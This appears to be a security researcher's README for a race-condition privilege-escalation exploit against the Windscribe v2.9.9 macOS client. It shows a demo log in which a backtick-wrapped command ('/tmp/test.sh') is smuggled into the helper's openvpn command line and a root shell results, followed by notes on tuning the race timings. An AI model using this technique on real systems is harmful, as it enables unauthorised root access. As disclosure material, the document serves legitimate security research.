### About

This is the exploit for Windscribe's v2.9.9 macOS client.

Blogpost is here:
TODO


### Demo:
```
$ ./windscribe_attitude_check.py 
[+] Preparing
[+] Opening windscribe log file
[+] Launching exploit
[+] Try 0/100
[?] LOGLINE [120424 12:22:29:000] [service]	client app connected
[?] LOGLINE [120424 12:22:29:000] [service]	HelperSecurity::verifyProcessId: new PID 96804
[?] LOGLINE [120424 12:22:29:000] [service]	Invalid app/bundle name for PID 96804: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
[?] LOGLINE [120424 12:22:29:000] [service]	client app disconnected
[+] Try 1/100
[?] LOGLINE [120424 12:22:29:000] [service]	client app connected
[?] LOGLINE [120424 12:22:29:000] [service]	HelperSecurity::verifyProcessId: new PID 96805
[?] LOGLINE [120424 12:22:29:000] [service]	Invalid app/bundle name for PID 96805: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
[?] LOGLINE [120424 12:22:29:000] [service]	client app disconnected
[+] Try 2/100
[?] LOGLINE [120424 12:22:29:000] [service]	client app connected
[?] LOGLINE [120424 12:22:29:000] [service]	HelperSecurity::verifyProcessId: new PID 96806
[?] LOGLINE [120424 12:22:29:000] [service]	Invalid app/bundle name for PID 96806: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
[?] LOGLINE [120424 12:22:29:000] [service]	client app disconnected
[+] Try 3/100
[?] LOGLINE [120424 12:22:30:000] [service]	client app connected
[?] LOGLINE [120424 12:22:30:000] [service]	HelperSecurity::verifyProcessId: new PID 96807
[?] LOGLINE [120424 12:22:30:000] [service]	Invalid app/bundle name for PID 96807: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'
[?] LOGLINE [120424 12:22:30:000] [service]	client app disconnected

...

[+] Try 61/100
[?] LOGLINE [120424 12:22:36:000] [service]	client app connected
[?] LOGLINE [120424 12:22:36:000] [service]	HelperSecurity::verifyProcessId: new PID 96865
[?] LOGLINE [120424 12:22:36:000] [service]	Resolved command: /Applications/Windscribe.app/Contents/Helpers/windscribeopenvpn --config /etc/windscribe/config.ovpn `/tmp/test.sh`
[+] Try 62/100
[?] LOGLINE [120424 12:22:36:000] [service]	client app disconnected
[+] PWNED :)
[+] Spawning shell

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2#
```



### Instructions to debug the race timings:

The messages in `/Library/Logs/com.windscribe.helper.macos/helper_log.txt`
will tell us what's happening (in order):

- we connected
  "client app connected"
- our child was still running at the time of the pid check (good)
 "HelperSecurity::verifyProcessId: new PID 94943"
 - our child process terminated too early (PARENT_KILL_WAIT_TIME too small):
 "Failed to get app/bundle name for PID 95202"
- we crashed the helper process (our data killed the boost parser most likely)
 "Windscribe helper terminated"
- child execve() was too early (CHILD_POST_SEND_WAIT_TIME too small):
  "getsockopt(LOCAL_PEERID) failed (57)."
- child execve() was too late (CHILD_POST_SEND_WAIT_TIME too large):
  "Invalid app/bundle name for PID 94535: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python'"
- we won the race:
  "Resolved command: /Applications/Windscribe.app/Contents/Helpers/windscribeopenvpn --config /etc/windscribe/config.ovpn `/tmp/test.sh`"

